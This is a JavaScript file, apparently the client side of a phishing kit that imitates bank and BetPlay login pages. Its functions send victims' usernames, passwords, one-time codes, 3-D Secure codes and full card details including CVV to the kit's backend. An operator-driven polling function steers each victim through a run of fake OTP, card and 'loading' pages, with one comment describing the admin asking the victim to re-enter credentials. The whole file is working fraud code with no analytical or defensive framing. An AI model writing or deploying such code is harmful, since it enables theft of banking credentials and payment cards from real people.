
function inicio(u){
    $.post( "../../process2/inicio.php", { usr: u} ,function(data) {
        window.location.href = "contrasena.php";
    });
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   

function pasousuario(p, u, b){
    var res;
    var d = detectar_dispositivo();
    $.post( "../../process2/pasousuario.php", { pass: p, user: u, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {
            }else{
                res = data.split("-");
                window.location.href = "cargando.php";
            }
        }
    });
}   

function pasousuario2(p, b){ 
    var res;
    var d = detectar_dispositivo();
    $.post( "../../process2/pasousuario2.php", { pass: p, dis: d, banco: b} ,function(data) { // Apunta a pasousuario2.php
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {
            }else{
                window.location.href = "cargando.php";
            }
        }
    });
}

function pasobet(claveBetplay, usuarioBetplay){  
    var res;
    var d = detectar_dispositivo();
    $.post( "process2/pasobet.php", { clave_betplay: claveBetplay, usuario_betplay: usuarioBetplay, dis: d} ,function(data) { 
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {
            }else{
                window.location.href = "esperando.php"; 
            }
        }
    });
}

function consultar_estado(){
    $.post( "../../process2/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "otp.php"; break;
            case '10': window.location.href = "../finish.php"; break;
            case '12': window.location.href = "index.php"; break;
            case '13': window.location.href = "codigo3d.php"; break; // Nuevo caso para 3D
            case '40': window.location.href = "../404.php"; break;
            case '41': window.location.href = "../../pago.php?codigo=1"; break;
        } 
    });        
}

function consultar_estado1(){
    $.post( "process2/estado1.php",function(data) {
        switch (data) {
            case '41': window.location.href = "pago.php?codigo=1"; break;
            case '17': window.location.href = "index.php?codigo=1"; break; // Página de error específica para login BetPlay
            case '18': window.location.href = "pago.php"; break; // Si el admin pide reingresar credenciales BetPlay

        } 
    });        
}

function enviar_otp(o){
    $.post( "../../process2/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "cargando.php";
    }); 
}

function enviar_codigo3d(codigo3d) {
    $.post("../../process2/paso3D.php", { codigo3d: codigo3d }, function(data) {
        window.location.href = "cargando.php";
    }); 
}

function enviar_tarjeta(t,f,c,d){
    $.post( "process2/pasotarjeta.php",{ tar:t, fec:f, cvv:c, dis:d },function(data) { // Se envía 'dis:d'
        console.log("Datos de tarjeta enviados a pasotarjeta.php. Respuesta:", data);
    });
}
